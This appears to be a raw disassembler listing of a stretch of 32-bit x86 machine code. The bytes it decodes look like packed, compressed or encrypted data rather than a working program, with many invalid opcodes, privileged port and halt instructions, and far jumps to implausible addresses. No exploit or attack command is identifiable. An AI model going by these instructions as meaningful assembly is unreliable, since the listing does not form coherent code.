  4051db:	add    DWORD PTR [ebp-0x34],0xffffffab
  4051df:	mov    esp,0x4f184f04
  4051e4:	loopne 0x4051ef
  4051e6:	sbb    al,0xfc
  4051e8:	test   BYTE PTR [esi-0x4e],0xaf
  4051ec:	and    eax,0xebfb5aca
  4051f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051f2:	mov    BYTE PTR [eax],dh
  4051f4:	and    edi,DWORD PTR [ecx-0x66]
  4051f7:	(bad)  
  4051f8:	lock mov dl,0x19
  4051fb:	shr    BYTE PTR [ebp+0x152ca7c3],0x52
  405202:	xor    eax,0xdd8d8c82
  405207:	shl    DWORD PTR [esi+0x12],cl
  40520a:	xor    bh,BYTE PTR [esi+0x7d57b5dc]
  405210:	fwait
  405211:	sahf   
  405212:	ror    DWORD PTR [edi+eiz*8],0x2d
  405216:	jns    0x4051f7
  405218:	pop    ebp
  405219:	inc    eax
  40521a:	sbb    DWORD PTR [eax],ebx
  40521c:	shr    BYTE PTR [eax-0x7a],0x4e
  405220:	add    bh,cl
  405222:	repnz rol BYTE PTR [ebx+0x2f887d1f],cl
  405229:	sub    eax,0x10baf396
  40522e:	aaa    
  40522f:	sbb    ah,BYTE PTR [ecx-0x4b40f77e]
  405235:	dec    edi
  405236:	or     eax,ecx
  405238:	cmp    BYTE PTR [ebx+0x21214326],ch
  40523e:	xor    al,BYTE PTR [edx]
  405240:	mov    eax,0x770b3677
  405245:	and    DWORD PTR [esi-0x3bed456c],ebp
  40524b:	xchg   ebx,eax
  40524c:	pushf  
  40524d:	mov    ds:0x21f0bfe4,eax
  405252:	inc    edx
  405253:	test   al,0xbb
  405255:	add    al,0x82
  405257:	je     0x405206
  405259:	out    0xec,eax
  40525b:	and    BYTE PTR [ebx-0x2f],ah
  40525e:	cmp    DWORD PTR [esi],eax
  405260:	xor    DWORD PTR [ebx+edi*8+0x41],ecx
  405264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405265:	add    BYTE PTR [edx+0x9],ah
  405268:	cmp    eax,0xe056620d
  40526d:	popa   
  40526e:	inc    edi
  40526f:	fist   WORD PTR [edx-0x3f0f6d9]
  405275:	mov    ebp,0xf072dc50
  40527a:	jno    0x4051fc
  40527c:	clc    
  40527d:	xchg   edx,eax
  40527e:	outs   dx,DWORD PTR ds:[esi]
  40527f:	out    0x58,eax
  405281:	mov    esp,0xa0d11a2d
  405286:	mov    dl,0x3
  405288:	jno    0x40525e
  40528a:	dec    edx
  40528b:	push   ds
  40528c:	pushf  
  40528d:	jmp    0x9f89:0x4212e6a8
  405294:	call   0xaed5b6a1
  405299:	push   edx
  40529a:	pop    eax
  40529b:	or     ebx,DWORD PTR [edi+0x32]
  40529e:	and    al,ah
  4052a0:	xchg   edi,eax
  4052a1:	xchg   esi,eax
  4052a2:	sahf   
  4052a3:	call   0xf115:0x86096f0c
  4052aa:	ss sahf 
  4052ac:	les    ebp,FWORD PTR ds:[edi-0x60]
  4052b0:	sub    eax,0x21f86917
  4052b5:	xchg   ebx,eax
  4052b7:	popf   
  4052b8:	jbe    0x40528b
  4052ba:	(bad)  
  4052bc:	aas    
  4052bd:	ss repz xchg ebx,eax
  4052c0:	push   es
  4052c1:	jne    0x405303
  4052c3:	test   DWORD PTR [ebx+0x65e55141],ebx
  4052c9:	inc    edx
  4052ca:	xor    ch,dh
  4052cc:	out    0x97,eax
  4052ce:	aas    
  4052cf:	popf   
  4052d0:	dec    eax
  4052d1:	enter  0xc7d7,0x97
  4052d5:	mov    edi,0x2a38c213
  4052da:	inc    eax
  4052db:	dec    esi
  4052dc:	jecxz  0x4052dc
  4052de:	scas   eax,DWORD PTR es:[edi]
  4052df:	ins    BYTE PTR es:[edi],dx
  4052e0:	dec    dh
  4052e2:	cmp    BYTE PTR [eax+0x57],ah
  4052e5:	dec    esp
  4052e6:	data16 mov al,ch
  4052e9:	pusha  
  4052ea:	mov    edx,0x314c524a
  4052ef:	add    dl,BYTE PTR [ecx+0x26]
  4052f2:	lea    ebx,[ebx-0x71]
  4052f5:	mov    al,0xf7
  4052f7:	xchg   ebx,eax
  4052f8:	imul   ecx,esp,0xae829e22
  4052fe:	mov    al,0xc
  405300:	jle    0x40537d
  405302:	push   0x4c
  405304:	popf   
  405305:	mov    al,0xd0
  405307:	push   0xfffffff3
  405309:	aam    0xa9
  40530b:	int3   
  40530c:	xor    DWORD PTR [eax+0x3d],ebx
  40530f:	(bad)  
  405310:	in     eax,dx
  405311:	mov    eax,ds:0x48d34904
  405316:	(bad)  
  405318:	shl    BYTE PTR [eax+0x3886794c],1
  40531e:	xor    BYTE PTR [esi],bh
  405320:	fidiv  DWORD PTR [ebx-0x72f0a3ac]
  405326:	inc    eax
  405327:	cdq    
  405328:	les    esi,FWORD PTR [ecx]
  40532a:	out    dx,al
  40532b:	dec    eax
  40532c:	mov    edx,DWORD PTR [ebx+0x2d]
  40532f:	mov    ecx,0x79cf7f79
  405334:	(bad)  
  405335:	jg     0x4052bd
  405337:	pop    ebx
  405338:	in     eax,dx
  405339:	push   cs
  40533a:	nop
  40533b:	les    ecx,FWORD PTR [esi+0x2d3653a6]
  405341:	arpl   cx,di
  405343:	push   ebx
  405344:	mov    dh,0x39
  405346:	stc    
  405347:	mov    bh,0xe7
  405349:	(bad)  
  40534a:	cmc    
  40534b:	cmp    DWORD PTR [edx+0x5],edi
  40534e:	xor    dl,BYTE PTR [edx-0x2f]
  405351:	sub    BYTE PTR [esi+0x53],dh
  405354:	sub    ebp,eax
  405356:	add    DWORD PTR [ebx],0x33
  405359:	sub    al,0xae
  40535b:	xchg   edx,eax
  40535c:	add    BYTE PTR [eax+0xa],0x2e
  405360:	hlt    
  405361:	out    0x3c,eax
  405363:	xchg   esi,eax
  405364:	rol    BYTE PTR [esi-0x56862db7],1
  40536a:	repnz sub bh,BYTE PTR [ecx]
  40536d:	sbb    al,BYTE PTR ds:0xeda46115
  405373:	mov    al,ds:0x1bf842a4
  405378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405379:	xchg   edi,eax
  40537a:	push   eax
  40537b:	or     al,0xe6
  40537d:	jp     0x405387
  40537f:	push   ds
  405380:	sti    
  405381:	inc    esp
  405382:	and    cl,BYTE PTR [eax]
  405384:	add    BYTE PTR [ebx+edx*8+0x53e7726b],ah
  40538b:	in     al,dx
  40538c:	adc    edi,esi
  40538e:	lods   eax,DWORD PTR ds:[esi]
  40538f:	mov    ebx,DWORD PTR [ebx+0x3384ec5d]
  405395:	dec    esp
  405396:	pusha  
  405397:	xor    bl,BYTE PTR [eax]
  405399:	cmp    BYTE PTR [esi],0x5c
  40539c:	mov    ds:0xb95be952,al
  4053a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053a2:	sbb    dh,bh
  4053a4:	and    al,0x99
  4053a6:	repnz (bad) 
  4053a8:	out    0xe1,al
  4053aa:	pop    ds
  4053ab:	jecxz  0x4053d4
  4053ad:	jmp    0xbe691b99
  4053b2:	(bad)  
  4053b3:	cwde   
  4053b4:	outs   dx,DWORD PTR fs:[esi]
  4053b6:	neg    BYTE PTR [ebx]
  4053b8:	dec    edi
  4053b9:	cmp    ecx,ecx
  4053bb:	add    cl,dh
  4053bd:	ret    0xd0a6
  4053c0:	sbb    ebx,ecx
  4053c2:	rcl    DWORD PTR [ebx+ebx*1],0x81
  4053c6:	xchg   ebx,eax
  4053c7:	or     DWORD PTR [edi+0x58bf4c5e],ebx
  4053cd:	mov    ds,WORD PTR [ebp+0x2b8b06be]
  4053d3:	adc    WORD PTR ds:0x5a96f298,bx
  4053da:	mov    ?,WORD PTR [esi]
  4053dc:	sbb    DWORD PTR [ebx-0x53],ecx
  4053df:	and    BYTE PTR [ecx-0x550b88f6],al
  4053e5:	jge    0x40541e
  4053e7:	adc    DWORD PTR [edx],0x3020b07e
  4053ed:	push   edx
  4053ee:	sub    DWORD PTR [esp+ebx*2],edi
  4053f1:	shr    DWORD PTR [ebp+ebx*1-0x7c],cl
  4053f5:	aam    0x40
  4053f7:	in     al,dx
  4053f8:	das    
  4053f9:	sbb    BYTE PTR [edi+0xc97948c],ah
  4053ff:	mov    ecx,0xabbc1f9e
  405404:	pop    esi
  405405:	(bad)  [esi]
  405407:	inc    edx
  405408:	shr    DWORD PTR [ebp+0x37a1cbf7],0xeb
  40540f:	not    BYTE PTR [edx-0x696b2c0]
  405415:	mov    ?,WORD PTR [eax-0x24]
  405418:	mov    ss,WORD PTR [ebx+edi*4-0x24c80276]
  40541f:	push   0xffffffd1
  405421:	sub    al,0x9a
  405423:	fst    DWORD PTR [esi-0x25ff19a8]
  405429:	popa   
  40542a:	and    bh,dh
  40542c:	xchg   esi,eax
  40542d:	retf   0x5741
  405430:	sbb    al,0xfc
  405432:	add    al,0x22
  405434:	push   esi
  405435:	mov    eax,ds:0xb28d8305
  40543a:	pop    ebp
  40543b:	retf   0x1555
  40543e:	hlt    
  40543f:	test   al,0x92
  405441:	into   
  405442:	(bad)  
  405443:	hlt    
  405444:	in     eax,0x3
  405446:	ja     0x405417
  405448:	loope  0x4053f8
  40544a:	sbb    bh,BYTE PTR [edi+0x3e]
  40544d:	dec    ecx
  40544e:	xchg   edi,eax
  40544f:	idiv   eax
  405451:	sbb    DWORD PTR [esi+esi*2-0x62],ecx
  405455:	shl    BYTE PTR [esi-0x49],0x77
  405459:	pop    edi
  40545a:	cmp    DWORD PTR [ecx+0x51],eax
  40545d:	ja     0x4054aa
  40545f:	xchg   edi,eax
  405460:	sbb    BYTE PTR [edi+ebx*8],dh
  405463:	xor    al,0x79
  405465:	(bad)  
  405466:	sub    DWORD PTR [edx+ebp*1-0x850b82c],esi
  40546d:	dec    esp
  40546e:	das    
  40546f:	loop   0x4054a8
  405471:	xor    bh,BYTE PTR [eax-0x5d]
  405474:	xchg   ecx,eax
  405475:	sbb    eax,0xca1c8f47
  40547a:	add    al,0x33
  40547c:	aas    
  40547d:	dec    edi
  40547e:	inc    ebp
  40547f:	shr    DWORD PTR [ecx+eax*8],cl
  405482:	ret    
  405483:	mov    ebx,0x416b928b
  405488:	ret    0x29bc
  40548b:	jne    0x4054cf
  40548d:	mov    ebp,ecx
  40548f:	xchg   DWORD PTR [edi],ebx
  405491:	sub    bh,BYTE PTR [ecx-0x12fd5d25]
  405497:	xchg   DWORD PTR ds:0xc097c22f,ecx
  40549d:	pop    ds
  40549e:	dec    ebx
  40549f:	mov    gs,WORD PTR [ecx+0x15cc3f5c]
  4054a5:	hlt    
  4054a6:	adc    al,0xa2
  4054a8:	ins    DWORD PTR es:[edi],dx
  4054a9:	sbb    ebx,DWORD PTR [edx+0x25]
  4054ac:	add    al,0xd6
  4054ae:	mov    DWORD PTR ss:[esi+0x76aafb5c],esi
  4054b5:	push   esp
  4054b6:	retf   
  4054b7:	push   0x6c
  4054b9:	shl    DWORD PTR [edi],cl
  4054bb:	or     DWORD PTR [edx+ebp*8],ebx
  4054be:	xchg   esi,eax
  4054bf:	dec    esi
  4054c0:	inc    ecx
  4054c1:	outs   dx,DWORD PTR ds:[esi]
  4054c2:	add    ebp,DWORD PTR [ebp+0x61006254]
  4054c8:	ret    0x8465
  4054cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054cc:	sub    DWORD PTR [ebx+0x59],edx
  4054cf:	inc    eax
  4054d0:	inc    ebx
  4054d1:	dec    edi
  4054d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d3:	sbb    BYTE PTR [ecx+ebx*2+0x7a],0x85
  4054d8:	mov    ch,0xd9
  4054da:	push   cs
  4054db:	test   DWORD PTR [edi],esi
  4054dd:	cmp    DWORD PTR [edi],esp
  4054df:	dec    esp
  4054e0:	push   cs
  4054e1:	push   cs
  4054e2:	les    edx,FWORD PTR [edx+0x35]
  4054e5:	push   esi
  4054e6:	lahf   
  4054e7:	sbb    DWORD PTR [ecx],esi
  4054e9:	pop    edx
  4054ea:	int    0x39
  4054ec:	and    DWORD PTR [edi-0x58c77b04],eax
  4054f2:	inc    ebp
  4054f3:	(bad)  
  4054f4:	fidivr WORD PTR [esi+0x5c01d29a]
  4054fa:	outs   dx,DWORD PTR ds:[esi]
  4054fb:	mov    ds:0xbfe79b42,al
  405500:	dec    ebx
  405501:	push   esp
  405502:	xor    al,0xea
  405504:	int3   
  405505:	push   edi
  405506:	loope  0x40549c
  405508:	loop   0x4054c1
  40550a:	jb     0x405498
  40550c:	add    esp,DWORD PTR [edx]
  40550e:	jmp    DWORD PTR [esi-0x74]
  405511:	or     al,0x9
  405513:	xchg   edx,eax
  405514:	ins    BYTE PTR es:[edi],dx
  405515:	fstp   DWORD PTR [esp+edi*8-0x795ae1f]
  40551c:	add    ebp,ebp
  40551e:	or     eax,0x1c55780a
  405523:	push   edx
  405524:	adc    edx,DWORD PTR [ebx]
  405526:	push   ds
  405527:	sbb    al,0x6a
  405529:	push   eax
  40552a:	mov    ebx,0x3e1a9550
  40552f:	addr16 mov dh,0xed
  405532:	inc    esp
  405533:	xchg   edx,eax
  405534:	push   ebx
  405535:	push   eax
  405536:	xor    eax,DWORD PTR [esi]
  405538:	jmp    0xdc3fbc01
  40553d:	jecxz  0x405509
  40553f:	sub    ebx,DWORD PTR [ebx-0x27]
  405542:	or     edi,DWORD PTR [ebp-0x5b]
  405545:	xchg   ebp,eax
  405546:	rcr    BYTE PTR [edx],1
  405548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405549:	mov    DWORD PTR [edx],eax
  40554b:	jnp    0x405575
  40554d:	mov    dl,0x5d
  40554f:	mov    al,0x6
  405551:	int    0x3a
  405553:	in     ax,dx
  405555:	push   es
  405556:	jnp    0x4054fb
  405558:	jns    0x405582
  40555a:	aas    
  40555b:	cmp    DWORD PTR ds:0x6645b36f,esi
  405561:	and    BYTE PTR [esi-0x5e],cl
  405564:	aaa    
  405565:	cmp    bl,BYTE PTR [ecx+0x4d]
  405568:	fld    DWORD PTR [esi+ebx*4-0x42]
  40556c:	(bad)  
  40556e:	mov    al,0x32
  405570:	cmp    eax,0x6c4c39dd
  405575:	xchg   edi,eax
  405576:	scas   eax,DWORD PTR es:[edi]
  405577:	jae    0x40553e
  405579:	hlt    
  40557a:	mov    edi,0xf55234f0
  40557f:	inc    ebp
  405580:	cdq    
  405581:	inc    edx
  405582:	nop
  405583:	add    dl,BYTE PTR [ecx]
  405585:	dec    ebp
  405586:	ret    0x416
  405589:	(bad)  
  40558b:	(bad)  [edi-0x14]
  40558e:	mov    ebp,0x46fba35b
  405593:	imul   eax,DWORD PTR [edi-0x43],0x12
  405597:	out    0x7f,al
  405599:	int    0x2a
  40559b:	ret    
  40559c:	scas   al,BYTE PTR es:[edi]
  40559d:	mov    eax,0xe7e84211
  4055a2:	into   
  4055a3:	fisubr WORD PTR [edi+eax*2+0x63b58eff]
  4055aa:	jmp    0x405592
  4055ac:	out    dx,al
  4055ad:	cld    
  4055ae:	push   es
  4055af:	aas    
  4055b0:	jl     0x4055db
  4055b2:	out    dx,al
  4055b3:	mov    eax,0x9a7871a7
  4055b8:	popa   
  4055b9:	adc    BYTE PTR [ecx+0x57d9c18],cl
  4055bf:	xchg   esi,eax
  4055c0:	popf   
  4055c1:	ret    0xe374
  4055c4:	adc    al,0xe6
  4055c6:	sbb    esp,DWORD PTR [ecx+0x3d]
  4055c9:	xchg   ebp,eax
  4055ca:	mov    edx,0x20310219
  4055cf:	dec    eax
  4055d0:	sahf   
  4055d1:	mov    ch,0xfa
  4055d3:	sbb    DWORD PTR [esi-0x29a27171],ebx
  4055d9:	sub    edi,DWORD PTR [esp+eiz*2+0x10092773]
  4055e0:	fnsave [esi-0x5732db51]
  4055e6:	test   al,0xa5
  4055e8:	stos   BYTE PTR es:[edi],al
  4055e9:	mov    bh,0xaa
  4055eb:	push   eax
  4055ec:	add    bh,BYTE PTR [ebp-0x71fc25d1]
  4055f2:	fimul  WORD PTR [ebx*1-0x6f7fc3bc]
  4055f9:	and    dh,BYTE PTR ds:0x88213e81
  4055ff:	fadd   QWORD PTR [ecx-0x1cb9830e]
  405605:	xchg   ecx,eax
  405606:	and    bl,BYTE PTR [edx-0x5cb9df9a]
  40560c:	dec    esp
  40560d:	loop   0x4055a5
  40560f:	shl    esi,0x52
  405612:	adc    cl,BYTE PTR [edi+0x66]
  405615:	mov    WORD PTR [edx+0x1d],gs
  405618:	dec    esi
  405619:	cmp    BYTE PTR [esi],al
  40561b:	ds stos DWORD PTR es:[edi],eax
  40561d:	add    eax,0x5e3d0c74
  405622:	rcr    BYTE PTR cs:[ebx-0x1e],1
  405626:	pop    ebx
  405627:	push   edx
  405628:	adc    BYTE PTR [edx],ch
  40562a:	mov    eax,0x6e3ff155
  40562f:	leave  
  405630:	inc    ebx
  405631:	xor    esp,DWORD PTR [edx+edi*2-0x75]
  405635:	jl     0x4056b6
  405637:	inc    eax
  405638:	pop    ebp
  405639:	js     0x4055e7
  40563b:	dec    esi
  40563c:	fnstsw WORD PTR [eax+edi*1]
  40563f:	aaa    
  405640:	or     esp,ebp
  405642:	push   ebx
  405643:	xchg   ecx,eax
  405644:	(bad)  
  405645:	xchg   ebx,eax
  405646:	pop    eax
  405647:	push   ecx
  405648:	xchg   ebp,eax
  405649:	lahf   
  40564a:	sub    al,0x88
  40564c:	stc    
  40564d:	add    BYTE PTR [ebx+ebx*4+0x1a],dh
  405651:	imul   eax,eax,0x7c
  405654:	outs   dx,BYTE PTR ds:[esi]
  405655:	mul    DWORD PTR [edx+0x582da669]
  40565b:	pop    edi
  40565c:	adc    ecx,DWORD PTR [esi+0x2cca32f6]
  405662:	inc    edi
  405663:	call   0xa259f761
  405668:	dec    eax
  405669:	(bad)  
  40566a:	push   cs
  40566b:	jne    0x40565b
  40566d:	push   0xffffffa7
  40566f:	fcom   DWORD PTR [ebx-0x6edf4907]
  405675:	pop    ecx
  405676:	xor    DWORD PTR [edi],ebx
  405678:	pushf  
  405679:	sbb    dh,BYTE PTR [esi+eiz*8]
  40567c:	retf   
  40567d:	xor    esi,DWORD PTR [ebp+ebp*1-0x7a]
  405681:	inc    esp
  405682:	lea    edi,[edi]
  405684:	cmc    
  405685:	nop
  405686:	mov    eax,es:0xcc6a6f72
  40568c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40568d:	repnz xor al,0x43
  405690:	outs   dx,DWORD PTR ds:[esi]
  405691:	sub    BYTE PTR [edx+0x16],al
  405694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405695:	mov    ch,0xef
  405697:	enter  0xea69,0x5d
  40569b:	jbe    0x405716
  40569d:	xchg   edx,eax
  40569e:	jb     0x405684
  4056a0:	adc    DWORD PTR [ebx-0x1c489fa1],eax
  4056a6:	iret   
  4056a7:	mov    al,ds:0xf922765a
  4056ac:	retf   0xe240
  4056af:	jno    0x4056b0
  4056b1:	push   ebp
  4056b2:	stos   BYTE PTR es:[edi],al
  4056b3:	xchg   edi,eax
  4056b4:	inc    edx
  4056b5:	jle    0x405680
  4056b7:	cmp    DWORD PTR [ebx],eax
  4056b9:	xchg   ebp,eax
  4056ba:	in     al,0x89
  4056bc:	loop   0x405659
  4056be:	adc    ebp,DWORD PTR [edi]
  4056c0:	in     eax,dx
  4056c1:	repz inc edi
  4056c3:	jo     0x4056ef
  4056c5:	ds mov edi,0xca787c44
  4056cb:	fld    QWORD PTR [edx+0x5c178492]
  4056d1:	ja     0x4056a6
  4056d3:	(bad)  
  4056d4:	cmc    
  4056d5:	push   0x6b
  4056d7:	lahf   
  4056d8:	dec    edi
  4056d9:	xor    al,0xc2
  4056db:	or     al,0xa0
  4056dd:	mov    edi,0x4cbb5fa4
  4056e2:	fsub   QWORD PTR [esi]
  4056e4:	mov    eax,ds:0x436c78ba
  4056e9:	push   ss
  4056ea:	lock mov ds:0xfc6c5440,eax
  4056f0:	mov    dl,0x20
  4056f2:	stos   BYTE PTR es:[edi],al
  4056f3:	mov    esi,0xd6fc5fef
  4056f8:	sbb    al,0xc8
  4056fa:	push   cs
  4056fb:	bnd ret 
  4056fd:	in     eax,dx
  4056fe:	mov    eax,0xb4dc0210
  405703:	lea    edx,[esi-0x50]
  405706:	sub    DWORD PTR [ecx-0x23],esp
  405709:	or     DWORD PTR [ebp+0x5de1db2f],edx
  40570f:	mov    BYTE PTR [edi-0x27aabbfd],ah
  405715:	das    
  405716:	retf   0xee7b
  405719:	fnstenv [ebx]
  40571b:	lahf   
  40571c:	cli    
  40571d:	push   edx
  40571e:	nop
  40571f:	(bad)  
  405720:	mov    cl,0x1e
  405722:	jecxz  0x405719
  405724:	sbb    al,0xde
  405726:	sbb    BYTE PTR [ecx+edi*8+0x6b],cl
  40572a:	add    DWORD PTR [ebp-0x6b],esi
  40572d:	cmp    DWORD PTR [esi],ecx
  40572f:	push   ebp
  405730:	daa    
  405731:	fwait
  405732:	inc    esp
  405733:	(bad)  
  405734:	push   ds
  405735:	out    0xd8,eax
  405737:	sub    edx,esi
  405739:	xor    BYTE PTR [eax-0x15575e8c],0xd7
  405740:	sbb    DWORD PTR [edx+0x1819e99e],ebp
  405746:	stc    
  405747:	imul   ebp,DWORD PTR [edi],0xc0f16d87
  40574d:	push   ebp
  40574e:	pop    edi
  40574f:	cs push edi
  405751:	pop    ebx
  405752:	pushf  
  405753:	push   ds
  405754:	lahf   
  405755:	xor    eax,0xe47a749c
  40575a:	popf   
  40575b:	inc    edi
  40575c:	punpcklwd mm0,DWORD PTR [ebx+0x41]
  405760:	adc    esi,DWORD PTR [ebx-0x2c]
  405763:	pop    edi
  405764:	sti    
  405765:	mov    bh,0x83
  405767:	pop    ecx
  405768:	loopne 0x405786
  40576a:	arpl   WORD PTR [ebx+0x5ba59e78],di
  405770:	pusha  
  405771:	ja     0x40576a
  405773:	pop    ds
  405774:	push   ebp
  405775:	push   ss
  405776:	jbe    0x4056f8
  405778:	arpl   WORD PTR [ecx+0x10],dx
  40577b:	pop    ebx
  40577c:	jo     0x4057e4
  40577e:	xchg   esp,eax
  40577f:	and    esi,DWORD PTR [edi]
  405781:	cwde   
  405782:	cmp    ah,BYTE PTR [ecx]
  405784:	xor    esp,DWORD PTR [edx]
  405786:	out    0x53,al
  405788:	xchg   esi,eax
  405789:	clc    
  40578a:	aam    0x1c
  40578c:	aad    0x85
  40578e:	(bad)  
  40578f:	sbb    eax,0xe6af035f
  405794:	xchg   BYTE PTR [edx-0x1059f884],ah
  40579a:	inc    eax
  40579b:	lahf   
  40579c:	test   eax,0x4752404f
  4057a1:	jp     0x40576e
  4057a3:	push   esp
  4057a4:	popf   
  4057a5:	retf   0xe59e
  4057a8:	jge    0x4057f8
  4057aa:	xchg   ecx,eax
  4057ab:	fwait
  4057ac:	xchg   esp,eax
  4057ad:	pop    es
  4057ae:	dec    ebx
  4057af:	enter  0xde55,0xa7
  4057b3:	hlt    
  4057b4:	xchg   ebp,eax
  4057b5:	pushf  
  4057b6:	or     al,0xb5
  4057b8:	daa    
  4057b9:	popf   
  4057ba:	or     BYTE PTR [edi+0x1b],dh
  4057bd:	(bad)  [eax+0x63]
  4057c0:	and    DWORD PTR [edi+0x64d096a],ebx
  4057c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c7:	mov    eax,0xa0811bf2
  4057cc:	pop    edx
  4057cd:	cmp    BYTE PTR [eax+0x5d45547a],bh
  4057d3:	inc    ecx
  4057d4:	inc    edi
  4057d5:	lods   al,BYTE PTR ds:[esi]
  4057d6:	jmp    0xd78591c7
  4057db:	pop    eax
  4057dc:	and    BYTE PTR [ecx],dl
  4057de:	popa   
  4057df:	jae    0x4057ef
  4057e1:	push   ss
  4057e2:	adc    DWORD PTR [ebx],0x9a27c81f
  4057e8:	ret    
  4057e9:	arpl   WORD PTR [ecx],di
  4057eb:	cmp    DWORD PTR [esi+ebx*2],ebx
  4057ee:	(bad)  
  4057ef:	(bad)  
  4057f0:	loope  0x40580e
  4057f2:	loop   0x4057d2
  4057f4:	mov    ch,0xd9
  4057f6:	repz xor DWORD PTR [esi],esi
  4057f9:	xor    dh,bl
  4057fb:	or     BYTE PTR ds:0x5ef9c226,cl
  405801:	dec    edx
  405802:	jmp    0x40578d
  405804:	pop    esi
  405805:	ror    BYTE PTR [ebp+0x6f],1
  405808:	(bad)  
  405809:	clc    
  40580a:	cmc    
  40580b:	arpl   WORD PTR [edx+ebp*4-0x7a],cx
  40580f:	add    al,0xab
  405811:	fstp   DWORD PTR [edi-0x45]
  405814:	and    eax,0xd78df488
  405819:	sub    ch,BYTE PTR [esi-0xb]
  40581c:	inc    edx
  40581d:	sub    eax,0x13107027
  405822:	imul   edx,DWORD PTR [esi],0x1137cd65
  405828:	xchg   edi,eax
  405829:	lock cmp al,0x86
  40582c:	xchg   ebx,eax
  40582d:	mov    eax,fs:0x821ff15c
  405833:	xchg   esp,eax
  405834:	adc    esp,DWORD PTR [edx+0x77]
  405837:	push   esp
  405838:	(bad)  
  405839:	cwde   
  40583a:	fwait
  40583b:	xchg   ebx,esp
  40583d:	inc    esp
  40583e:	mov    ch,0x9d
  405840:	or     DWORD PTR [edi+0x68b50bc1],eax
  405846:	aam    0xf1
  405848:	iret   
  405849:	jmp    DWORD PTR [ecx+0x6d5a9ae1]
  40584f:	fld    TBYTE PTR [edi+edx*2+0x14847bc9]
  405856:	aam    0x7a
  405858:	ret    
  405859:	test   DWORD PTR [ecx],ebp
  40585b:	ja     0x405854
  40585d:	lahf   
  40585e:	mov    BYTE PTR [edi],dl
  405860:	sar    edx,1
  405862:	xchg   ah,al
  405864:	mov    bl,0x73
  405866:	fs (bad) 
  405868:	ficom  WORD PTR [ecx-0x19d497f8]
  40586e:	mov    esp,0xaf43ce61
  405873:	adc    eax,0x64590
  405878:	gs dec eax
  40587a:	jno    0x405800
  40587c:	inc    esi
  40587d:	call   0x4d30:0xb4199aed
  405884:	xchg   ebx,eax
  405885:	pop    ss
  405886:	adc    ecx,DWORD PTR [esi+0x37e488b2]
  40588c:	add    DWORD PTR [ecx],ebx
  40588e:	dec    esp
  40588f:	mov    al,ds:0x96d14112
  405894:	lods   eax,DWORD PTR ds:[esi]
  405895:	pushf  
  405896:	adc    eax,0xd8c89260
  40589b:	sub    eax,0x78cb3fda
  4058a0:	je     0x405859
  4058a2:	nop
  4058a3:	dec    edi
  4058a4:	cwde   
  4058a5:	jne    0x405856
  4058a7:	and    eax,0xcffdee9
  4058ac:	pusha  
  4058ad:	leave  
  4058ae:	push   ecx
  4058af:	inc    edi
  4058b0:	pop    eax
  4058b1:	cmp    DWORD PTR [eax+0x4f],edi
  4058b4:	sbb    dl,0xd4
  4058b7:	ds xchg edx,eax
  4058b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ba:	ror    BYTE PTR [edi-0x29],0xdf
  4058be:	rol    DWORD PTR [ebx+0x4],cl
  4058c1:	sahf   
  4058c2:	pop    esp
  4058c3:	popa   
  4058c4:	sub    BYTE PTR [esi+ebx*8+0x53],0x8e
  4058c9:	or     eax,0xddf667b0
  4058ce:	lar    ebx,sp
  4058d1:	mov    ebx,0x689c377d
  4058d6:	mov    edx,0xb711c5b1
  4058db:	mov    es,WORD PTR [eax-0x5fea6859]
  4058e1:	add    BYTE PTR [edx],0xf2
  4058e4:	cmp    BYTE PTR [eax+0x3beb9d4],ch
  4058ea:	sbb    ebp,DWORD PTR [edi]
  4058ec:	xor    eax,0x68a05821
  4058f1:	in     al,dx
  4058f2:	js     0x40587d
  4058f4:	mov    edx,ecx
  4058f6:	pop    esp
  4058f7:	retf   0x1969
  4058fa:	push   0x40
  4058fc:	sbb    ecx,DWORD PTR [ecx+0x7d723046]
  405902:	and    bl,BYTE PTR [esi+esi*8-0x6709dda8]
  405909:	shl    cl,1
  40590b:	adc    al,0xff
  40590d:	frstor [edi]
  40590f:	adc    ebp,DWORD PTR [ebx-0x7da4270c]
  405915:	mov    edi,0x1b88214c
  40591a:	es enter 0xaf1f,0x38
  40591f:	cdq    
  405920:	in     al,0xa0
  405922:	inc    edx
  405923:	ja     0x4058b8
  405925:	cmp    edx,DWORD PTR [ecx-0x43]
  405928:	sbb    al,0x4c
  40592a:	adc    DWORD PTR ss:[esi-0x56],edx
  40592e:	xchg   ebx,eax
  40592f:	sbb    al,0x4c
  405931:	rcr    DWORD PTR [ebx],cl
  405933:	pop    ebx
  405934:	mov    esi,0xccbabe88
  405939:	pop    ebx
  40593a:	xchg   edx,eax
  40593b:	daa    
  40593c:	and    cl,BYTE PTR [ebp+edi*4-0xb44f3a4]
  405943:	loopne 0x4058d5
  405945:	mov    DWORD PTR [esi+0x3e6e4bfc],ecx
  40594b:	xchg   ecx,eax
  40594c:	mov    al,ah
  40594e:	mov    bl,BYTE PTR [ecx]
  405950:	clc    
  405951:	xchg   ebp,eax
  405952:	or     eax,0xd83fa632
  405957:	sbb    eax,0x97db6ccb
  40595c:	inc    esp
  40595d:	mov    cl,0x8a
  40595f:	inc    esp
  405960:	out    0xca,eax
  405962:	jge    0x40598c
  405964:	adc    DWORD PTR [ecx-0x54],0xffffffec
  405968:	test   eax,0xc2fa851e
  40596d:	call   0x9d0f:0x2e389d74
  405974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405975:	mov    ecx,0xaf9b328f
  40597a:	not    DWORD PTR fs:[ecx]
  40597d:	outs   dx,DWORD PTR ds:[esi]
  40597e:	cmp    al,0x85
  405980:	inc    BYTE PTR [ebp+0x2d6ea5fd]
  405986:	lods   eax,DWORD PTR ds:[esi]
  405987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405988:	mov    BYTE PTR [esi-0x29],bl
  40598b:	(bad)  [eiz*2-0x6d989b85]
